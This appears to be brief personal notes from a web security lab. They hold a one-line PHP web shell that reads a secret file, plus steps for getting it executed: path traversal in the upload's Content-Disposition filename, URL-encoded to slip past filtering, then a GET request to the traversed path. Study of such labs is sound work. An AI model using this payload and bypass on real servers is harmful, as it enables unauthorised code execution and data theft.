<?php echo file_get_contents('/home/carlos/secret'); ?>
//upload happens but when get requwst is seen in burp the content of shell file is shown in text
//Change the Content-Disposition header value to ../payload.php in the POST request
//the response says the file is uploaded but strips the directory traversal directive
//encode the Content-Disposition header value to ..%2fpayload.php 
//GET /files/avatars/../payload.php HTTP/2 and read the secred 